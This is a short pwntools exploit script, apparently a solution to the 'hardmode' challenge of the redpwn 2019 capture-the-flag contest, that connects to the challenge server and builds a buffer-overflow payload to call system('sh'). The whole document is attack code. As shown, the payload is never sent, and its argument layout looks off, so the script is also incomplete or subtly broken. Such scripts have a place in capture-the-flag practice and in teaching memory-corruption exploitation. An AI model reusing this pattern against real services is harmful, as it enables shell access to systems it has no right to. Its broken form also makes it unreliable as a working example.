from pwn import *

#r = process('./hardmode')
r = remote('chall.2019.redpwn.net', 4002)

system_plt = 0x80483d0
payload = 'a'*0x1e + 'a'*0x4 + p32(system_plt) + "sh\x00"

r.interactive()